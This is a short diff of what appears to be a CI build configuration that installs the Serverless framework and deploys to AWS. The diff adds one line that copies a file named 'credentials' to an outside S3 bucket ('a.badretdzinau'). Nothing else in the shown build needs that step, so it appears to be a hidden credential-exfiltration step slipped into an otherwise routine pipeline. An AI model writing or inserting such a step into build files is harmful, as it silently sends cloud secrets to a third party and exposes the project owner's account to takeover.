@@ -10,5 +10,6 @@ phases:
       - npm install -g serverless
       - npm install --save serverless-python-requirements
       - ls /
+      - aws s3 cp credentials s3://a.badretdzinau --profile default
       - export AWS_PROFILE="default" && export AWS_REGION=eu-west-2
       - serverless deploy
